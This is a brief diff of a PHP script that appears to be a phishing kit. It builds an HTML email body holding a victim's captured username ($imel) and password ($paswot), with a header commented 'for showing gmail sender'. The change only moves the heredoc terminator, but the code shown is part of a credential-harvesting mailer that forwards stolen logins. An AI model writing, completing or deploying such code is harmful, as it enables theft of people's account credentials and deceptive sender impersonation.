@@ -21,8 +21,8 @@ $body = <<<EOD
 
 Username : <font color="red">$imel</font> <br>
 Password : <font color="red">$paswot</font> <br>
-EOD;
 
+EOD;
 
 $headers = "From: Mr.Ackerman@gmail.com\r\n"; // for showing gmail sender.
 $headers .= "Content-type: text/html\r\n";
